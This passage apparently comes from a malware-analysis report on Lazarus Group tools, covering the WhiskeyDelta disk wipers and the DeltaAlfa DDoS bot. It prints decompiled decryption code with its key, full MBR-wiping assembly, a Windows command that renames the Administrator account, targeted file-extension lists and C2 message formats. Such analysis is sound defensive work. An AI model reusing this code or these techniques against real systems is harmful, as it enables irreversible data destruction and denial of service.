deletes file named hnbsvc.dll\n\n[file] epdtsvc.dll Securely deletes file named epdtsvc.dll\n\n[file] jdfsvc.dll Securely deletes file named jdfsvc.dll\n\n[file] pdaisvc.dll Securely deletes file named pdaisvc.dll\n\n[hard] Destroys the content of all hard drives and shuts down Windows\n\n**Table 4-3: Contents of a WhiskeyCharlie Command File Found in the Wild**\n\n\n-----\n\n### 5. [Wiper] WhiskeyDelta\n\nWhiskeyDelta is a family of destructive malware that destroys all the data on a victim’s hard drive on the file system and\nsector level. There are two known versions of WhiskeyDelta, WhiskeyDelta-One and WhiskeyDelta-Two. WhiskeyDelta-One\nrepresents a baseline for the feature set within the WhiskeyDelta family, while WhiskeyDelta-Two adds C2 communication,\nwraps the core WhiskeyDelta code within a service executable, and renames the Administrator account.\n\nThe core WhiskeyDelta functionality consists of the following tasks:\n\n1. Decrypt the name of two services (Alerter and SENS) as well as the data blob that WhiskeyDelta uses to replace\n\nthe MBR of attached hard drives\n\n2. Stop the Alerter and SENS services on the victim’s computer\n\n3. Get partition information for all physical drives\n\n4. Replace the MBR for each physical drive attached to the victim’s computer with a Trojanized MBR and corrupt the\n\npartition table\n\n5. Enumerate all files on all lettered drives (C:, D:, etc.) and delete the files that meet a specific criteria (which is vari­\n\nant-specific)\n\n6. Overwrite the first 132 MB (WhiskeyDelta-One) or 1.5 MB (WhiskeyDelta-Two) of each partition of each physical\n\ndrive with random data from heap memory\n\n7. [Windows XP or older] Overwrite each sector of each partition of each physical drive with random data from heap\n\nmemory or [Windows Vista or newer] overwrite 0x7C00 bytes starting at sector 1 with random data from heap memory\n\nWhiskeyDelta uses a decryption scheme that differs from the majority of the Lazarus Group’s families. Seen in Figure\n5-1, the scheme consists of multiple XORs to mutate an array and then apply an XOR to each byte of the encrypted data.\nWhiskeyDelta uses the encryption scheme to decrypt the names of the two services to stop (Task 2) as well as the data\nblob containing the MBR Trojan (Task 4). WhiskeyDelta-One requires that the key to decrypt the data be present on the\ncommand line while WhiskeyDelta-Two supplies the key. Fortunately for analysts, the key appears to be the same across\nboth variants: uANcspWJk9DByduoaXBCq0DZZF3jZKDI.\n\n\n-----\n\n```\n          void Decrypt(char *pvData, int dwLength, const void *pszKey)\n          {\n           char sbox[32];\n           int i = 0;\n           qmemcpy(sbox, pszKey, sizeof(sbox));\n           if ( dwLength > 0 )\n           {\n            unsigned char k = sbox[0];\n            do\n            {\n             k ^= sbox[31] ^ sbox[21];\n             pvData[i] ^= k;\n             int j = 30;\n             do\n             {\n              sbox[j + 1] = sbox[j];\n              --j;\n             }\n             while ( j > -1 );\n             ++i;\n             sbox[0] = k;\n            }\n            while ( i < dwLength );\n           }\n          }\n\n```\n**Figure 5-1: WhiskeyDelta’s Decryption Function**\n\nTask 4, the MBR replacement (seen in Figure 5-2), has remarkable structural and functional similarities to the MBR Trojan\nused by WhiskeyAlfa-Three (see Section 2.3) in the SPE attack. The MBR Trojan begins by reading a copy of the first drive’s\n(drive 0x80) MBR into memory at 0000:7000 (using the real mode memory model). The MBR Trojan enters an endless\nloop where the following events occur:\n\n1. Random data from memory at 0000:0000 through 0000:FFFF is written to each physical drive starting at sector 0\n\nand incrementing by 192 sectors for 256 writes per drive.\n\n2. The original MBR is copied to the sector 0 of the first physical drive (drive 0x80)\n\n3. The loop repeats indefinitely.\n\nThe Disk Access Packet (DAP) specifies that the disk write operation will overwrite 128 sectors with random data from\nmemory at 0000:0000 through 0000:FFFF, but after each write the pointer to the next sector is incremented by 192\nsectors, meaning that 64 sectors are left untouched for each write. It is unclear why the start of the next write operation is\nincremented by 192 when the memory write is 128 sectors. The 128 sector limitation, in this case, is most likely due to the\n64Kb boundary issue that occurs in 16-bit mode. In any case, assuming an ideal situation, the MBR Trojan will destroy the\ndata on the attached hard drives.\n\n\n-----\n\n```\n            MBR:7C00 start:     xor   ax, ax\n            MBR:7C02         mov   ss, ax\n            MBR:7C04         mov   sp, 7C00h\n            MBR:7C07         sti\n            MBR:7C08         push  ax\n            MBR:7C09         pop   es\n            MBR:7C0A         push  ax\n            MBR:7C0B         pop   ds\n            MBR:7C0C         cld\n            MBR:7C0D         mov   si, offset dapMBR\n            MBR:7C10         mov   dl, 80h     ; Physical drive number\n            MBR:7C12         mov   ah, 42h     ; Func: EXTENDED READ\n            MBR:7C14         mov   al, 0\n            MBR:7C16         int   13h       ; BIOS DISK function\n            MBR:7C18         mov   si, offset dap ; SI = PTR to DAP\n            MBR:7C1B         xor   cx, cx\n            MBR:7C1D\n            MBR:7C1D loop:\n            MBR:7C1D         inc   cx\n            MBR:7C1E         cmp   cx, 2048\n            MBR:7C22         jz   short duplicateMBR\n            MBR:7C24\n            MBR:7C24 overwriteSectors:\n            MBR:7C24         mov   ah, 43h     ; Func: EXTENDED WRITE\n            MBR:7C26         mov   al, 0      ; Verify Flag = No Verify\n            MBR:7C28         int   13h       ; BIOS DISK function\n            MBR:7C2A         inc   dl       ; Physical drive number\n            MBR:7C2C         mov   al, dl\n            MBR:7C2E         cmp   al, 84h     ; last physical drive?\n            MBR:7C30         jl   short overwriteSectors\n\n```\n**MBR:7C32         mov   dl, 80h     ; use first physical drive**\n```\n            MBR:7C34         mov   bp, offset dap.lbaStartingSectorToWrite\n            MBR:7C37         add   word ptr [bp+0], 192\n            MBR:7C3C         adc   word ptr [bp+2], 0\n            MBR:7C40         adc   word ptr [bp+4], 0\n            MBR:7C44         adc   word ptr [bp+6], 0\n            MBR:7C48         jmp   short loop\n            MBR:7C4A ; ----------------------------------------------------------------\n            MBR:7C4A\n            MBR:7C4A duplicateMBR:\n            MBR:7C4A         mov   ax, ptr ds:dap.lbaStartingSectorToWrite\n            MBR:7C4D         mov   ds:71A8h, ax\n            MBR:7C50         mov   ax, ptr ds:dap.lbaStartingSectorToWrite+2\n            MBR:7C53         mov   ds:71AAh, ax\n            MBR:7C56         mov   ax, ptr ds:dap.lbaStartingSectorToWrite+4\n            MBR:7C59         mov   ds:71ACh, ax\n            MBR:7C5C         mov   ax, ptr ds:dap.lbaStartingSectorToWrite+6\n            MBR:7C5F         mov   ds:71AEh, ax\n            MBR:7C62         mov   si, offset dapMBR\n            MBR:7C65         mov   ah, 43h     ; Func: EXTENDED WRITE\n            MBR:7C67         mov   al, 0      ; Verify Flag = No Verify\n            MBR:7C69         int   13h       ; BIOS DISK function\n            MBR:7C6B         xor   cx, cx\n            MBR:7C6D         mov   si, offset dap\n            MBR:7C70         jmp   short loop\n            MBR:7C70 ; -----------------------------------------------------------------\n            MBR:7C72 junkData    db 5Ch, 8Ah, 6, 0, 0C1h, 50h, 1, 2 dup(0)\n            MBR:7C72         db 5Eh, 114h dup(0)\n            MBR:7D90 dapMBR     db 10h         ; size\n            MBR:7D90         db 0          ; unused _ zero\n            MBR:7D90         dw 1          ; sectorCount\n            MBR:7D90         dd 7000h        ; ptrToDataToWrite\n            MBR:7D90         dq 0          ; lbaStartingSectorToWrite\n            MBR:7DA0 dap       db 10h         ; size\n            MBR:7DA0         db 0          ; unused _ zero\n            MBR:7DA0         dw 128         ; sectorCount\n            MBR:7DA0         dd 0          ; ptrToDataToWrite\n            MBR:7DA0         dq 0          ; lbaStartingSectorToWrite\n\n```\n**Figure 5-2: WhiskeyDelta’s MBR Trojan Code**\n\n\n-----\n\nPrior to writing the MBR Trojan to the physical disks, the partition information is destroyed by replacing the starting\nsector LBA value, the partition type value, and the starting sector CHS address values with random data. This renders\nthe partition type information inaccessible by means of parsing the MBR going forward, but it would still be possible to\nlook at the size of the partition by the partition size field and the partition’s end sector LBA value to calculate the original\nstarting sector LBA.\n\nAfter replacing the MBR with the Trojanized MBR, WhiskeyDelta begins the process of destroying files from the victim’s\ncomputer by enumerating all the files on all of the lettered drives. Starting at drive A: and progressing through drive\n```\n       Z:, WhiskeyDelta recursively scans through each directory and their subdirectories looking for files that meet a specific\n\n```\ncriteria, typically a specific file extension as explained in following sections on the WhiskeyDelta variants. WhiskeyDelta\ndoes not enumerate any files within the %WINDIR% and %PROGRAMFILES% directories. For each file found that meets the\ncriteria for destruction, WhiskeyDelta overwrites the file with random data. The specifics of the overwrite are variant-de­\npendent. After overwriting a file’s contents, the file is deleted.\n\nWhiskeyDelta performs two different sector overwrite attacks. Using the partition information obtained during Task 3,\nWhiskeyDelta overwrites either 132 MB (WhiskeyDelta-One) or 1.5 MB (WhiskeyDelta-Two) starting at the first sector of\neach partition on each physical drive. WhiskeyDelta uses random data from the heap to perform the overwrite task.\n\nIf the victim’s machine is running Windows XP or older, after destroying the data on the physical drive at the partition\nboundaries, WhiskeyDelta then overwrites the entirety of the physical drive using eight threads to divvy the work load\nbefore finally using a single thread to overwrite the entirety of the physical drive in sequential sector order. For those\nvictims running Windows Vista and newer, the final task consists of overwriting 0x7C00 bytes (31,744 bytes) of the boot\nsectors starting at sector 1 (LBA offset 512) using random bytes from heap memory. The WhiskeyDelta change in behavior\nbased on the operating system’s version relates to the changes that were introduced with Windows Vista and newer\nregarding the way raw disk access is handled:[9] Vista and newer versions of Windows can only access the boot sectors via\nthe \\\\.\\PhysicalDrive interface.\n\n[9 Microsoft. “Changes to the file system and to the storage stack to restrict direct disk access and direct volume access in Windows Vista and in Windows Server 2008“ https://support.microsoft.com/en-us/kb/942448 31](https://support.microsoft.com/en-us/kb/942448)\n\nJanuary 2008.\n\n\n-----\n\n|.php|.gul|.alz|\n|---|---|---|\n|.asp|.hwp|.rar|\n|.aspx|.doc|.zip|\n|.jsp|.docx|.cpp|\n|.java|.xls|.h|\n|.kwp|.xlsx|.c|\n|.eml|.ppt||\n|.pst|.pptx||\n|.wpd|.pdf||\n|.wri|.mdb||\n\n\n#### 5.1 WhiskeyDelta-One\n\nWhiskeyDelta-One provides the baseline for the WhiskeyDelta variants in term of functionality and design. Consisting of\nonly 13 non-library functions, WhiskeyDelta-One is a streamlined executable that was designed and executed for the sole\npurpose of data destruction. There are a few notable features found in WhiskeyDelta-One that are not found in Whiskey­\nDelta-Two:\n\n1. The task of obtaining the partition information for the physical drives (Task 3) is a IOCTL call\n\n2. The file selection criteria for the file destruction task (Task 5) is limited to a small subset of file extensions for those\n\nfiles larger than 4 MB.\n\n3. The file destruction operation against selected files is simple and independent of selection criteria, unlike WhiskeyDelta-Two\n\n4. The file destruction operation is single-threaded, and therefore more time-consuming\n\nWhiskeyDelta-One, despite its simplicity, does require a password for it to operate successfully. The task of decrypting\nthe names of the Windows services the malware stops and decrypting the MBR Trojan require a 32-byte alphanumeric\npassword to be supplied on the command line. While this does aide in hampering analysis of the MBR Trojan, it also\nprovides additional work for the attacker to ensure the correct password is supplied. There is no error checking to ensure\nthe validity of the password so it is entirely possible for the attacker (or any analyst) to supply an incorrect password,\nresulting in invalid strings for the names of the services and an invalid MBR Trojan. However, given the significant\nnumber of other destructive attacks the malware employs, it is unlikely that such a failure on the part of the attacker\nwould interfere in any data destruction given a long enough running time for the malware.\n\nWhiskeyDelta-One uses a DeviceIoControl call for IOCTL_DISK_GET_DRIVE_LAYOUT_EX in order to obtain the\nconfiguration of the physical drives. WhiskeyDelta-One stores this information in a global array that later operations\n(specifically the partition and sector overwrite tasks) will use once the MBR data has been corrupted.\n\nWhen selecting files for destruction during the file destruction operation (Task 5), WhiskeyDelta-One looks at the file\nextension to determine if a file should be overwritten with random data. The bulk of the files that WhiskeyDelta-One targets\n(Figure 5-3) fall under the category of source code and corporate documents.\n```\n         .php .gul .alz\n         .asp .hwp .rar\n         .aspx .doc .zip\n         .jsp .docx .cpp\n         .java .xls .h\n         .kwp .xlsx .c\n         .eml .ppt\n         .pst .pptx\n         .wpd .pdf\n         .wri .mdb\n\n```\n**Figure 5-3: WhiskeyDelta-One's File Extension Targeting List**\n\nThe destruction process is size-dependent. For those files that are less than 4 MB in size and have the desired file\nextension, the overwrite process consists of writing 256KB over the file regardless of the file’s original size. If a file is over\n4 MB in size, regardless of its file extension, the overwrite process consists of overwriting the first 256 KB of the file and\nthe last 256 KB of the file. Regardless of whether or not a file is selected for destruction by overwriting its data, the file is\ndeleted via a call to DeleteFile.\n\n\n-----\n\n#### 5.2 WhiskeyDelta-Two\n\nAugmented with C2 reporting functionality, more robust file selection criteria, the ability to modify the victim’s\n```\n       Administrator account name, and constructed as a service executable under the service name RPCSecruity (complete\n\n```\nwith misspelling), WhiskeyDelta-Two is an escalation in functionality over WhiskeyDelta-One. WhiskeyDelta-Two does\nnot require a command line argument to decrypt the MBR Trojan or the names of the services to stop, meaning that the\nservices names and MBR Trojan will always properly decode. WhiskeyDelta-Two does, however, take a single command line\nargument (a number) that it later transmits to a C2 server as part of a larger status report transmission.\n\nThe first notable difference in WhiskeyDelta-Two is the inclusion of a function that attempts to rename the administrator’s\naccount. Spawned as its own thread, the function will sleep for 10 seconds before attempting to execute the code in Figure 5-4.\n```\n          srand(time(0));\n          w = rand();\n          x = rand();\n          y = rand();\n          z = rand();\n          sprintf(newName, “HaHaHa _ %d%d%d%d”, z, y, x, w);\n          sprintf(CmdLine, “cmd.exe /c net user Administrator %s”, newName);\n          WinExec(CmdLine, 0);\n\n```\n**Figure 5-4: WhiskeyDelta-Two's Administrator Account Renaming Code**\n\nIf successful, the Administrator account will be renamed with HaHaHa_ followed by 4 to 20 digits.\nWhiskeyDelta-Two modifies the registry, in much the same way as WhiskeyCharlie’s [swap] command (see Section 4), to\nforce the Windows operating system to purge the page file once the victim’s machine shuts down. Unlike WhiskeyCharlie,\nhowever, WhiskeyDelta-Two does not induce paging by filling large heap arrays with random data.\n\nWhen obtaining partition information for the attached physical drives, WhiskeyDelta-Two reads the drive’s MBR and\nparses the partition tables directly. The information about the partitions is then stored in a pair of global arrays which the\npartition and sector overwrite operations later use to determine the size and offsets of the partitions and the overall size\nof the drives.\n\nHaving replaced the MBR with the MBR Trojan, WhiskeyDelta-Two reports its status by randomly selecting from the C2\nserver addresses hardcoded within itself and attempting to connect to the server. The communication between\nWhiskeyDelta-Two and its C2 server consists of a handshake/authentication test and two data transmissions encrypted\nwith the DNSCALC-style encoding scheme.\n\n\n-----\n\nDNSCALC is an older malware family, used by several APT groups and first profiled in 2010, whose claim to\nfame was the use of DNS lookups for domain names that would return specific IP addresses used to calculate\nthe listening port number for the C2 server. One notable feature of DNSCALC was the use of a combination of\nXOR with an ADD operation and XOR with a SUB operation for the purposes of encrypting and decrypting data\nstreams. Since at least 2011, the Lazarus Group has commandeered this technique for use in a variety of their\nmalware families. The DNSCALC version of this encoding/decoding scheme performed the transformation\noperation on each byte using two lines of C code such as\n```\n            d += 122;\n            d ^= 25;\n\n```\nwhere the values 122 and 25 constitute the encryption and decryption keys. The Lazarus Group performs the\nsame operation in a single line of code, such as\n```\n            d = (e ^ 25) – 122\n\n```\nand\n```\n            e = (d + 122) ^ 25\n\n```\nThis subtle, but important, distinction in style indicates that the code was not directly copied from DNSCALC,\nbut rather was inspired by DNSCALC or another source that performs the same transform. It should be noted\nthat DNSCALC modified the Gh0st RAT MyEncode function, seen below, by reversing the order of operations\nmeaning that the Lazarus Group’s use of the encoding scheme represents a derivation of an existing derivation.\n```\n            char* MyEncode(char *str)\n            {\n                int i, len;\n                char *p;\n                char *s, *data;\n                len = strlen(str) + 1;\n                s = (char *)malloc(len);\n                memcpy(s, str, len);\n                for (i = 0; i < len; i++)\n                {\n                     s[i] ^= 0x19;\n                     s[i] += 0x86;\n                }\n                base64 _ encode(s, len, &data);\n                free(s);\n                return data;\n            }\n\n```\nThe DNSCALC-style encoding scheme code is heavily used throughout many of the various malware families for\nwhich the Lazarus Group is responsible.\n\n\n-----\n\n|OFFSET|SIZE|DESCRIPTION|\n|---|---|---|\n|0|4 Bytes [DWORD]|Datagram Type (Set to 0x811)|\n|4|2 Bytes [WORD]|Payload Size (Set to 0)|\n|6|Variable (0 to 262 Bytes)|Optional Payload Data|\n\n|OFFSET|SIZE|DESCRIPTION|\n|---|---|---|\n|0|4 Bytes [DWORD]|Identifier as defined by the numerical value supplied on the command line when WhiskeyDelta-Two was activated|\n|4|260 Bytes|NULL-terminated string containing the victim’s computer name as reported by GetComputerNameA|\n|264|4 Byte|Number of lettered drives found on the victim’s system|\n|268|4 Bytes|Unused, possibly used to 8-byte alignment space|\n|272|8 Bytes [ULARGE_INTEGER]|Total free space for all drives|\n|280|4 Bytes|Number of physical drives found on the victim’s system|\n|284|4 Bytes|Number of files found on the victim’s system|\n|288|4 Bytes|Non-zero if victim’s system is Vista or newer|\n|292|4 Bytes|Date and time that WhiskeyDelta-Two was executed (as reported by time function)|\n|296|4 Bytes|Number of seconds from the Administrator rename, page file purge setting change, and MBR Trojan installation|\n|300|4 Bytes|Unused|\n\n\nThe handshake/authentication test consists of WhiskeyDelta-Two generating a 16-byte random buffer that it encodes\nusing the DNSCALC-style encoding before sending to the C2 server. The C2 server responds with the same 16-byte\nrandom buffer encrypted with DNSCALC-style encoding that WhiskeyDelta-Two removes to reveal the decrypted 16\nbytes. The decrypted response from the C2 server is then compared to the original 16-byte buffer to ensure they are\nidentical. Failing this, the connection between the C2 server and the WhiskeyDelta-Two malware is terminated.\n\nWhile WhiskeyDelta-Two’s system of authentication seems somewhat rational at face value, it is heavily flawed. Since\nthe data buffer being sent to the C2 server is encoded with the reciprocal scheme that WhiskeyDelta-Two uses to decrypt\nthe data stream, the C2 server merely needs to mirror requests from the WhiskeyDelta-Two malware as the C2 server’s\nresponse. As a result, this provides absolutely no authentication for the malware.\n\nAfter the authentication phase, communication between WhiskeyDelta-Two and the C2 server takes the form of\nDNSCALC-style encoded datagrams. The format for the datagrams is straightforward, as seen in Table 5-1, and is a\nscheme used in a multitude of other Lazarus Group malware families, contributing to a shared code base that enabled\nNovetta to link seemingly unconnected malware families to the Lazarus Group. At a minimum, a datagram consists of a\ntype field and a payload size field contributing to a minimum datagram size of 6 bytes. An optional payload field can have a\nsize of up to 262 bytes, meaning the maximum allowed datagram is 268 bytes in size.\n\n**OFFSET** **SIZE** **DESCRIPTION**\n\n0 4 Bytes [DWORD] Datagram Type (Set to 0x811)\n\n4 2 Bytes [WORD] Payload Size (Set to 0)\n\n6 Variable (0 to 262 Bytes) Optional Payload Data\n\n**Table 5-1: WhiskeyDelta-Two’s Datagram Structure**\n\nAfter the initial authentication, WhiskeyDelta-Two sends a login transmission to the C2 server. The login datagram\ncontains no payload data, and the type value is set to 0x811. Following the login, WhiskeyDelta-Two transmits a status\nreport to the C2 server that details the current state of the malware’s destruction tasks. This status report datagram is 304\nbytes in length and contains the information (and structure) defined in Table 5-2.\n\n**OFFSET** **SIZE** **DESCRIPTION**\n\nIdentifier as defined by the numerical value supplied on the command line when\n0 4 Bytes [DWORD]\nWhiskeyDelta-Two was activated\n\nNULL-terminated string containing the victim’s computer name as reported by\n4 260 Bytes\n```\n                         GetComputerNameA\n\n```\n264 4 Byte Number of lettered drives found on the victim’s system\n\n268 4 Bytes Unused, possibly used to 8-byte alignment space\n\n8 Bytes\n272 Total free space for all drives\n\n[ULARGE_INTEGER]\n\n280 4 Bytes Number of physical drives found on the victim’s system\n\n284 4 Bytes Number of files found on the victim’s system\n\n288 4 Bytes Non-zero if victim’s system is Vista or newer\n\n292 4 Bytes Date and time that WhiskeyDelta-Two was executed (as reported by time\nfunction)\n\nNumber of seconds from the Administrator rename, page file purge setting change,\n296 4 Bytes\nand MBR Trojan installation\n\n300 4 Bytes Unused\n\n**Table 5-2: WhiskeyDelta-Two’s Status Report Structure**\n\n\n-----\n\n|.log|.myi|.db2|\n|---|---|---|\n|.evt|.frm|.db|\n|.bak|.dbf|.pls|\n|.mdf|.arc|.plb|\n|.ldf|.rdo|.pks|\n|.sql|.mdb|.pkb|\n|.myd|.accdb|.pck|\n\n|.php|.docx|.h|.conf|.png|\n|---|---|---|---|---|\n|.asp|.xls|.c|.config|.iso|\n|.aspx|.xlsx|.htm|.ini|.cs|\n|.jsp|.ppt|.mht|.avi||\n|.java|.pptx|.html|.wmv||\n|.eml|.pdf|.xml|.asf||\n|.pst|.alz|.txt|.gif||\n|.gul|.rar|.inc|.swf||\n|.hwp|.zip|.js|.tif||\n|.doc|.cpp|.vb|.mpg||\n\n\nThe initial report to the C2 server only contains valid data for the identifier field (offset 0), the computer name (offset 4),\nthe number of physical drives (offset 280), and the activation time (offset 292).\n\nThe file destruction task (Task 5) for WhiskeyDelta-Two is significantly more involved than that of WhiskeyDelta-One.\nThe first noticeable change is that for each drive that WhiskeyDelta-Two enumerates, a new thread is generated to handle\nthe enumeration and destruction process, after first cataloguing the amount of free space available on the drive (to be\nlater reported in offset 272 of the status report to the C2 server). The enumeration and file selection process is more\nspecific not only in which file extensions are of interest, but also how these specific file types are destroyed. There are\nthree distinct criteria for determining if WhiskeyDelta-Two overwrites a file or not:\n\n1. Does the file have an extension that the author(s) of WhiskeyDelta-Two refer to as a “backup” file (Figure 5-5).\n```\n           .log .myi .db2\n           .evt .frm .db\n           .bak .dbf .pls\n           .mdf .arc .plb\n           .ldf .rdo .pks\n           .sql .mdb .pkb\n           .myd .accdb .pck\n\n```\n**Figure 5-5: File Extensions for \"Backup\" Files Targeted by WhiskeyDelta-Two**\n\n2. Is the file larger than 4 MB\n\n3. Does the file have an extension that the author(s) of WhiskeyDelta-Two refer to as simply “a file” (Figure 5-6).\n```\n           .php .docx .h .conf .png\n\n```\n`.asp` `.xls` `.c` **.config** `.iso`\n```\n           .aspx .xlsx .htm .ini .cs\n           .jsp .ppt .mht .avi\n           .java .pptx .html .wmv\n           .eml .pdf .xml .asf\n           .pst .alz .txt .gif\n           .gul .rar .inc .swf\n           .hwp .zip .js .tif\n           .doc .cpp .vb .mpg\n\n```\n**Figure 5-6: File Extensions that WhiskeyDelta-Two Targets for Destruction**\n\nIf a file is deemed a backup file by WhiskeyDelta-Two, the overwrite function completely overwrites the file with random\ndata. If a file is larger than 4 MB, WhiskeyDelta-Two will perform the same overwrite function that WhiskeyDelta-One\nperforms on files larger than 4 MB, which consists of overwriting the first and last 256 KB of the file with random data.\nIf a file has an extension that WhiskeyDelta-Two classifies as simply “a file,” the first 256 KB of the file are overwritten\nwith random data in the same manner that WhiskeyDelta-One would overwrite files with targeted extensions. It should\nbe noted that before any file destruction can occur, WhiskeyDelta-Two generates a 256 KB buffer of random data, unlike\nWhiskeyDelta-One, which uses whatever data is currently on the heap at the time.\n\nAfter completing the file destruction task, WhiskeyDelta-Two again reports to the C2 server (though it may randomly\n\n\n-----\n\nselect a different server) with the full set of fields properly set and valid. After completing either the 0x7C00-byte\noverwrite of the boot sectors (starting at sector 1) (if the victim is running Windows Vista or later) or the complete\noverwrite of the logical drives and sectors (if the victim is running Windows XP or older), WhiskeyDelta-Two shuts down\nthe victim’s computer; thanks to the modified registry entry, this causes Windows to purge the contents of the page file.\n\n\n-----\n\n|START FILE FILENAMES|TARGET FILENAMES|\n|---|---|\n|skmsvxd.dat|skinpfu.dat|\n|dasrrvm.dat|doqmcru.dat|\n\n\n### 6. [DDoS Bot] DeltaAlfa\n\nObserved as part of the Ten Days of Rain campaign as well as being observed being dropped as part of the payload\ndeployed by IndiaGolf, DeltaAlfa is a distributed denial-of-service (DDoS) bot. Unlike the majority of DDoS malware that\ncontact a central C2 server for instruction, DeltaAlfa uses files stored on the victim’s hard drive for the list of targets to\nattack and to indicate the start time of an attack. The names of the target and start time files differ by sample (see Table\n6-1) and are installed on the victim’s system by the IndiaGolf installer.\n\n**START FILE FILENAMES** **TARGET FILENAMES**\n\nskmsvxd.dat skinpfu.dat\n\ndasrrvm.dat doqmcru.dat\n\n**Table 6-1: Known Filenames of the Start and Target Files for DeltaAlfa**\n\nDeltaAlfa operates as a service DLL supported by svchost. Once activated by svchost, DeltaAlfa begins by decrypting a\ndata blob found within the resource section of its own binary. The data blob consists of strings representing function\nnames for the dynamic API loading functionality as well as key operational strings (e.g., user-agent strings, HTTP request\nformat strings). The encryption scheme for the strings consists of a 7-byte rotating XOR string.\n\nDeltaAlfa dynamically loads a variety of API functions, many of which are not used by DeltaAlfa; this may be indicative of\na library that may be found in other, currently unobserved, malware families. DeltaAlfa then verifies the existence of the\nstart file. If the start file is found, the contents of the file are loaded into memory as a VARIANTTIME object (effectively a\n```\n        double data type) and compared against the current datetime. Prior to the comparison, the current datetime is modified\n\n```\nto set the year to 2011, which is an odd conditional modification (see Figure 6-1). If the start file exists and the start time\nhas not passed, DeltaAlfa will sleep for 60 seconds before attempting the check again. If the start time has passed, the\nstart file is deleted by DeltaAlfa which will shortcut the check for future launches of DeltaAlfa.\n\n\n-----\n\n|OFFSET|SIZE (IN BYTES)|DESCRIPTION|\n|---|---|---|\n|0x000|1 [Boolean]|If set, the record is a viable target (e.g. “enabled”)|\n|0x001|32 [NULL-terminated string]|Target’s Hostname|\n|0x021|128 [NULL-terminated string]|Target URL (for HTTP attacks)|\n|0x0A1|128 [32 DWORDs]|Resolved IPs for the Target’s Hostname|\n|0x121|4 [DWORD]|Number of resolved IPs for the Target’s Hostname|\n|0x125|2 [WORD]|Target Port|\n|0x127|1 [Boolean]|Enable DNS Resolver Attack|\n|0x128|1 [Boolean]|Enable UDP Attack|\n|0x129|1 [Boolean]|Enable ICMP (Ping) Attack|\n|0x12A|4 [DWORD]|Maximum number of attacks against target|\n\n```\n          signed int AttackStartTimeCheck()\n          {\n           struct _SYSTEMTIME SystemTime;\n           double startTime;\n           double now_2011;\n           DWORD dwBytesRead;\n           HANDLE hFile = CreateFileA(\"skmsvxd.dat\", 0x80000000, 0, 0, 3, 128, 0);\n           if (hFile != -1 )\n           {\n            if ( ReadFile(hFile, &startTime, 8, &dwBytesRead, 0)\n              && dwBytesRead == 8 )\n            {\n             CloseHandle(hFile);\n             GetSystemTime(&SystemTime);\n             SystemTime.wYear = 2011;\n             SystemTimeToVariantTime(&SystemTime, &now_2011);\n             if ( now_2011 < startTime)\n              return 0;\n            }\n            else\n            {\n             CloseHandle(hFile);\n            }\n            DeleteFileA(\"skmsvxd.dat\");\n           }\n           return 1;\n          }\n\n```\n**Figure 6-1: DeltaAlfa’s Function for Determining if an Attack Should Begin**\n\nDeltaAlfa loads the target file into memory then decrypts the contents using a 128-bit key (that varies from sample to\nsample) before parsing the contents. Once parsed, each target has its own data structure that defines the target, the types\nof attacks to perform against the target, and the maximum number of attacks to perform (Table 6-2).\n\n**OFFSET** **SIZE (IN BYTES)** **DESCRIPTION**\n\n0x000 1 [Boolean] If set, the record is a viable target (e.g. “enabled”)\n\n0x001 32 [NULL-terminated string] Target’s Hostname\n\n0x021 128 [NULL-terminated string] Target URL (for HTTP attacks)\n\n0x0A1 128 [32 DWORDs] Resolved IPs for the Target’s Hostname\n\n0x121 4 [DWORD] Number of resolved IPs for the Target’s Hostname\n\n0x125 2 [WORD] Target Port\n\n0x127 1 [Boolean] Enable DNS Resolver Attack\n\n0x128 1 [Boolean] Enable UDP Attack\n\n0x129 1 [Boolean] Enable ICMP (Ping) Attack\n\n0x12A 4 [DWORD] Maximum number of attacks against target\n\n**Table 6-2: DeltaAlfa’s Target Information Structure**\n\nBefore issuing any attacks, DeltaAlfa spawns a continual resolver thread. The continual resolver thread is responsible\nfor refreshing the list of target IP addresses (the array at offset 0x0A1 within the target’s information structure) for each\ntarget. The continual resolver thread calls the function to refresh the IP addresses for each target once every 60 seconds.\n\n\n-----\n\n|ATTACK TYPE|DESCRIPTION|\n|---|---|\n|DNS Attack|If the Target’s Hostname field is non-empty, the hostname is resolved using the DnsQuery API function with a request for all DNS record types to be returned. If the Target’s Hostname field is empty, however, all DNS record types for google.com, yahoo.com, naver.com, daum.net, and microsoft.com are requested through the DnsQuery API function.|\n|UDP Attack|A UDP packet containing 1024 bytes of random data is generated and transmitted to the target.|\n|ICMP Attack|An ICMP Echo-reply packet is generated and transmitted via a raw socket to the target. The body of the Echo-reply contains 200 bytes of random data. The identifier and sequence numbers of the packet are sequential (starting at 1) for each packet generated.|\n|HTTP Attack|A burst of 5 HTTP GET requests are made to the Target’s Hostname for the Target URL.|\n\n\nThe resolver’s refresh function refreshes those targets whose resolved IPs count is set to 0 (as indicated by the value at\noffset 0x121 in the target’s information structure). Every 30 minutes, however, regardless of the number of resolved IPs\nfor a target, the continual resolver thread forces the refresh function to resolve the target’s hostname and update the list\nof IP addresses.\n\nA new attack thread is generated for each target. The attack thread can perform several different attacks as defined in\nTable 6-3. The DNS Attack is an exclusive attack in that, if specified in the target’s information structure, no other attack\ntype is permitted. However, the UDP, ICMP and HTTP attacks can occur against the same target within the same target\ninformational record. Note that not all samples support the DNS, UDP and ICMP attacks, but all observed samples\nsupport the HTTP attack.\n\n**ATTACK TYPE** **DESCRIPTION**\n\nIf the Target’s Hostname field is non-empty, the hostname is resolved using the DnsQuery API\nfunction with a request for all DNS record types to be returned. If the Target’s Hostname field is\n\nDNS Attack\n\nempty, however, all DNS record types for google.com, yahoo.com, naver.com, daum.net,\nand microsoft.com are requested through the DnsQuery API function.\n\nUDP Attack A UDP packet containing 1024 bytes of random data is generated and transmitted to the target.\n\nAn ICMP Echo-reply packet is generated and transmitted via a raw socket to the target. The body of\n\nICMP Attack the Echo-reply contains 200 bytes of random data. The identifier and sequence numbers of the packet\n\nare sequential (starting at 1) for each packet generated.\n\nHTTP Attack A burst of 5 HTTP GET requests are made to the Target’s Hostname for the Target URL.\n\n**Table 6-3: Attack Types of DeltaAlfa**\n\nThe HTTP attack has the most variety in its appearance when compared to the other DeltaAlfa attack types. The basic\nstructure of the HTTP attack consists of constructing an HTTP GET request manually with the format described in Figure 6-2.\n```\n         GET <Target’s Hostname plus the Target URL> HTTP/1.1\n         Accept: <Varies>\n         Accept-Language: ko\n         User-Agent: <Varies>\n\n```\n**Accept-Encoding: gzip, deflate**\n```\n         Cache-Control: no-store, must-revalidate\n         Proxy-Connection: Keep-Alive\n         Host: www.<Target’s Hostname>\n\n```\n**Figure 